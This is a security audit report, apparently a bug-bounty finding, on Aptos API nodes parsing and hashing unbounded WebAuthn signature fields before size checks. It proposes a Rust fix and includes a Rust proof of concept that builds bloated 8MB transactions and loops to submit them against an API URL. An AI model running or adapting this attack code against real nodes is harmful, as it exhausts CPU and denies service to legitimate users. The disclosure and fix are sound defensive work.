# Audit Report

## Title
WebAuthn Signature Fields Lack Size Validation Before Verification Leading to API Node DoS

## Summary
The transaction submission endpoint performs expensive cryptographic and parsing operations on unbounded WebAuthn `authenticator_data` and `client_data_json` fields before any transaction size validation occurs. Attackers can craft transactions with bloated WebAuthn signatures (up to 8MB) that pass the HTTP Content-Length check but consume excessive CPU resources during signature verification, enabling denial-of-service attacks against API nodes.

## Finding Description

The vulnerability exists in the transaction validation pipeline where WebAuthn signature verification happens before proper size checks. The attack exploits a multi-stage validation gap:

**Stage 1 - HTTP Layer:** The `PostSizeLimitEndpoint::call()` function only validates the HTTP Content-Length header against an 8MB limit (default). [1](#0-0) [2](#0-1) 

**Stage 2 - BCS Deserialization:** Transaction deserialization uses `bcs::from_bytes_with_limit` with only a depth limit (16), not a byte size limit on individual fields. [3](#0-2) [4](#0-3) 

**Stage 3 - Signature Verification (VULNERABILITY):** The `check_signature()` call happens immediately in `VMValidator::validate_transaction`, triggering expensive operations on unbounded WebAuthn fields. [5](#0-4) 

The WebAuthn `PartialAuthenticatorAssertionResponse` structure contains two unbounded `Vec<u8>` fields with no size constraints: [6](#0-5) 

During verification, these fields undergo expensive operations without prior size validation:
1. **JSON parsing** of `client_data_json` via `serde_json::from_slice` (CPU-intensive for large JSON)
2. **SHA-256 hashing** of potentially multi-megabyte `client_data_json`
3. **Concatenation** of `authenticator_data` and hash for verification data [7](#0-6) 

**Stage 4 - Transaction Size Check (TOO LATE):** Size validation occurs AFTER signature verification during gas meter initialization, and critically, only validates `raw_txn_bytes_len()` (excluding authenticator size). [8](#0-7) [9](#0-8) 

**Attack Path:**
1. Attacker crafts a BCS-encoded `SignedTransaction` with:
   - Small `RawTransaction` (~1KB, within 64KB limit)
   - `SingleSender` authenticator with `WebAuthn` signature
   - Bloated `client_data_json` (7MB) containing valid JSON with padding
   - Large `authenticator_data` (1MB) with extra bytes
2. Submit to `/transactions` endpoint
3. Passes `PostSizeLimitEndpoint` (total < 8MB)
4. Passes BCS deserialization (depth limit doesn't restrict field sizes)
5. `check_signature()` triggers:
   - `serde_json::from_slice` parses 7MB JSON (expensive)
   - `sha256()` hashes 7MB data (expensive)
   - Signature verification over concatenated data
6. Signature verification fails (invalid signature), but CPU damage already done
7. Transaction rejected, but attacker achieved resource exhaustion

This breaks **Invariant #9: Resource Limits** - operations must respect computational limits, but signature verification consumes unbounded CPU before any resource metering.

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty criteria: "Validator node slowdowns" and "API crashes")

**Quantified Impact:**
- **API Node DoS:** Each malicious transaction can consume seconds of CPU time parsing multi-megabyte JSON and performing cryptographic operations
- **Amplification Factor:** Attacker sends small HTTP requests (~8MB each) but triggers disproportionate CPU consumption
- **No Gas Cost:** Attack occurs before gas payment or prologue execution
- **Scalability:** Attacker can submit multiple transactions in parallel to exhaust API node resources
- **Availability Impact:** API nodes become unresponsive, preventing legitimate transaction submissions
- **Validator Impact:** If validators run API endpoints, this could slow down consensus participation

The vulnerability affects the **transaction validation pipeline** (Critical Invariant #7), specifically violating the requirement that validation must enforce resource limits before expensive operations.

## Likelihood Explanation

**Likelihood: High**

**Attack Requirements:**
- **No Authentication:** Anyone can submit transactions to public API endpoints
- **No Funds Required:** Attack happens before gas payment
- **Simple Exploitation:** Just craft BCS transaction with bloated WebAuthn fields
- **Low Cost:** HTTP POST requests cost attacker minimal resources
- **High Return:** Each request consumes significant victim CPU

**Feasibility:**
- WebAuthn signatures are legitimate authentication mechanism, so no feature flags block this
- BCS serialization libraries available in multiple languages
- No special permissions or validator access required
- Attack can be automated and scaled

**Detection Difficulty:**
- Transactions appear valid until signature verification completes
- No distinguishing characteristics at HTTP/network layer
- Rate limiting on transaction count won't help if each transaction is resource-intensive

## Recommendation

**Immediate Fix:** Add size validation on WebAuthn authenticator fields before signature verification.

**Recommended Implementation:**

```rust
// In types/src/transaction/webauthn.rs
pub const MAX_AUTHENTICATOR_DATA_BYTES: usize = 1024;  // 1KB sufficient for valid data
pub const MAX_CLIENT_DATA_JSON_BYTES: usize = 4096;    // 4KB sufficient for valid JSON

impl PartialAuthenticatorAssertionResponse {
    pub fn verify<T: Serialize + CryptoHash>(
        &self,
        message: &T,
        public_key: &AnyPublicKey,
    ) -> Result<()> {
        // ADD SIZE VALIDATION BEFORE EXPENSIVE OPERATIONS
        if self.authenticator_data.len() > MAX_AUTHENTICATOR_DATA_BYTES {
            bail!(
                "Authenticator data too large: {} bytes (max {})",
                self.authenticator_data.len(),
                MAX_AUTHENTICATOR_DATA_BYTES
            );
        }
        
        if self.client_data_json.len() > MAX_CLIENT_DATA_JSON_BYTES {
            bail!(
                "Client data JSON too large: {} bytes (max {})",
                self.client_data_json.len(),
                MAX_CLIENT_DATA_JSON_BYTES
            );
        }
        
        // Existing verification logic...
        let collected_client_data: CollectedClientData =
            serde_json::from_slice(self.client_data_json.as_slice())?;
        // ... rest of verification
    }
}
```

**Additional Hardening:**
1. Add transaction size check including authenticator BEFORE signature verification in `VMValidator::validate_transaction`
2. Use `TransactionMetadata` with full `txn_bytes_len()` instead of just `raw_txn_bytes_len()`
3. Consider adding authenticator size limits at BCS deserialization level
4. Implement rate limiting based on resource consumption, not just transaction count

## Proof of Concept

```rust
// PoC: Craft malicious WebAuthn transaction with bloated fields
use aptos_types::transaction::{
    authenticator::{
        AccountAuthenticator, AnyPublicKey, AnySignature, SingleKeyAuthenticator,
        TransactionAuthenticator,
    },
    webauthn::{AssertionSignature, PartialAuthenticatorAssertionResponse},
    RawTransaction, SignedTransaction,
};
use aptos_crypto::secp256r1_ecdsa::{PrivateKey, PublicKey};
use move_core_types::account_address::AccountAddress;

fn create_dos_transaction() -> SignedTransaction {
    // 1. Create minimal valid RawTransaction (~1KB)
    let sender = AccountAddress::random();
    let raw_txn = RawTransaction::new_script(
        sender,
        0,
        aptos_types::transaction::Script::new(vec![], vec![], vec![]),
        1_000_000,
        1,
        u64::MAX,
        aptos_types::chain_id::ChainId::test(),
    );

    // 2. Create bloated WebAuthn signature fields
    // Bloated client_data_json: 7MB of valid JSON
    let mut bloated_json = b"{\"type\":\"webauthn.get\",\"challenge\":\"test\",\"origin\":\"http://localhost\",\"crossOrigin\":false,\"padding\":\"".to_vec();
    bloated_json.extend(vec![b'A'; 7 * 1024 * 1024 - 200]); // 7MB padding
    bloated_json.extend(b"\"}");
    
    // Bloated authenticator_data: 1MB
    let bloated_auth_data = vec![0u8; 1024 * 1024];
    
    // Invalid signature (doesn't matter - damage done during verification)
    let fake_signature = aptos_crypto::secp256r1_ecdsa::Signature::try_from(&[0u8; 64][..]).unwrap();
    
    let webauthn_sig = PartialAuthenticatorAssertionResponse::new(
        AssertionSignature::Secp256r1Ecdsa { signature: fake_signature },
        bloated_auth_data,
        bloated_json,
    );
    
    // 3. Create authenticator with WebAuthn signature
    let pk = PublicKey::try_from(&[0u8; 65][..]).unwrap();
    let authenticator = TransactionAuthenticator::single_sender(
        AccountAuthenticator::single_key(SingleKeyAuthenticator::new(
            AnyPublicKey::secp256r1_ecdsa(pk),
            AnySignature::webauthn(webauthn_sig),
        )),
    );
    
    SignedTransaction::new(raw_txn, authenticator)
}

// Attack: Submit multiple transactions to exhaust API node CPU
fn execute_dos_attack(api_url: &str) {
    for i in 0..100 {
        let malicious_txn = create_dos_transaction();
        let bcs_bytes = bcs::to_bytes(&malicious_txn).unwrap();
        
        // Each transaction ~8MB, triggers expensive JSON parsing + SHA-256
        // Submit via POST /transactions with BCS content-type
        println!("Submitting DoS transaction #{}, size: {} bytes", i, bcs_bytes.len());
        // ... HTTP POST to api_url/transactions ...
    }
}
```

**Expected Behavior:** API node CPU usage spikes to 100% processing JSON parsing and SHA-256 operations, legitimate transactions time out or fail.

**Notes:**
- The constant `MAX_WEBAUTHN_SIGNATURE_BYTES` exists but only validates the signature length in JSON submission path, not the `authenticator_data` or `client_data_json` fields [10](#0-9) [11](#0-10) 

This vulnerability demonstrates a classic Time-of-Check-Time-of-Use (TOCTOU) issue where size validation occurs after expensive operations have already been performed.

### Citations

**File:** api/src/check_size.rs (L43-58)
```rust
    async fn call(&self, req: Request) -> Result<Self::Output> {
        if req.method() != Method::POST {
            return self.inner.call(req).await;
        }

        let content_length = req
            .headers()
            .typed_get::<headers::ContentLength>()
            .ok_or(SizedLimitError::MissingContentLength)?;

        if content_length.0 > self.max_size {
            return Err(SizedLimitError::PayloadTooLarge.into());
        }

        self.inner.call(req).await
    }
```

**File:** config/src/config/api_config.rs (L97-97)
```rust
const DEFAULT_REQUEST_CONTENT_LENGTH_LIMIT: u64 = 8 * 1024 * 1024; // 8 MB
```

**File:** api/src/transactions.rs (L851-851)
```rust
    const MAX_SIGNED_TRANSACTION_DEPTH: usize = 16;
```

**File:** api/src/transactions.rs (L1223-1232)
```rust
                let signed_transaction: SignedTransaction =
                    bcs::from_bytes_with_limit(&data.0, Self::MAX_SIGNED_TRANSACTION_DEPTH)
                        .context("Failed to deserialize input into SignedTransaction")
                        .map_err(|err| {
                            SubmitTransactionError::bad_request_with_code(
                                err,
                                AptosErrorCode::InvalidInput,
                                ledger_info,
                            )
                        })?;
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L3232-3237)
```rust
        let txn = match transaction.check_signature() {
            Ok(t) => t,
            _ => {
                return VMValidatorResult::error(StatusCode::INVALID_SIGNATURE);
            },
        };
```

**File:** types/src/transaction/webauthn.rs (L12-12)
```rust
pub const MAX_WEBAUTHN_SIGNATURE_BYTES: usize = 1024;
```

**File:** types/src/transaction/webauthn.rs (L78-96)
```rust
#[derive(Clone, Debug, Eq, Hash, PartialEq, Serialize, Deserialize)]
#[cfg_attr(feature = "fuzzing", derive(arbitrary::Arbitrary))]
pub struct PartialAuthenticatorAssertionResponse {
    /// This attribute contains the raw signature returned from the authenticator.
    /// NOTE: Many signatures returned from WebAuthn assertions are not raw signatures.
    /// As an example, Secp256r1 ECDSA signatures are encoded as an [ASN.1 DER Ecdsa-Sig_value](https://www.w3.org/TR/webauthn-3/#sctn-signature-attestation-types)
    /// If the signature is encoded, the client is expected to convert the encoded signature
    /// into a raw signature before including it in the transaction
    signature: AssertionSignature,
    /// This attribute contains the authenticator data returned by the authenticator.
    /// See [`AuthenticatorData`](passkey_types::ctap2::AuthenticatorData).
    #[serde(with = "serde_bytes")]
    authenticator_data: Vec<u8>,
    /// This attribute contains the JSON byte serialization of [`CollectedClientData`](CollectedClientData) passed to the
    /// authenticator by the client in order to generate this credential. The exact JSON serialization
    /// MUST be preserved, as the hash of the serialized client data has been computed over it.
    #[serde(with = "serde_bytes")]
    client_data_json: Vec<u8>,
}
```

**File:** types/src/transaction/webauthn.rs (L134-165)
```rust
    pub fn verify<T: Serialize + CryptoHash>(
        &self,
        message: &T,
        public_key: &AnyPublicKey,
    ) -> Result<()> {
        let collected_client_data: CollectedClientData =
            serde_json::from_slice(self.client_data_json.as_slice())?;
        let challenge_bytes = Bytes::try_from(collected_client_data.challenge.as_str())
            .map_err(|e| anyhow!("Failed to decode challenge bytes {:?}", e))?;

        // Check if expected challenge and actual challenge match. If there's no match, throw error
        verify_expected_challenge_from_message_matches_actual(message, challenge_bytes.as_slice())?;

        // Generates binary concatenation of authenticator_data and hash(client_data_json)
        let verification_data = generate_verification_data(
            self.authenticator_data.as_slice(),
            self.client_data_json.as_slice(),
        );

        // Note: We must call verify_arbitrary_msg instead of verify here. We do NOT want to
        // use verify because it BCS serializes and prefixes the message with a hash
        // via the signing_message function invocation
        match (&public_key, &self.signature) {
            (
                AnyPublicKey::Secp256r1Ecdsa { public_key },
                AssertionSignature::Secp256r1Ecdsa { signature },
            ) => signature.verify_arbitrary_msg(&verification_data, public_key),
            _ => Err(anyhow!(
                "WebAuthn verification failure, invalid key, signature pairing"
            )),
        }
    }
```

**File:** aptos-move/aptos-vm/src/transaction_metadata.rs (L63-63)
```rust
            transaction_size: (txn.raw_txn_bytes_len() as u64).into(),
```

**File:** aptos-move/aptos-vm/src/gas.rs (L109-121)
```rust
    } else if txn_metadata.transaction_size > txn_gas_params.max_transaction_size_in_bytes {
        speculative_warn!(
            log_context,
            format!(
                "[VM] Transaction size too big {} (max {})",
                txn_metadata.transaction_size, txn_gas_params.max_transaction_size_in_bytes
            ),
        );
        return Err(VMStatus::error(
            StatusCode::EXCEEDED_MAX_TRANSACTION_SIZE,
            None,
        ));
    }
```

**File:** api/types/src/transaction.rs (L1498-1502)
```rust
        } else if signature_len > MAX_WEBAUTHN_SIGNATURE_BYTES {
            bail!(
                "The WebAuthn signature length is greater than the maximum number of {} bytes: found {} bytes.",
                MAX_WEBAUTHN_SIGNATURE_BYTES, signature_len
            )
```
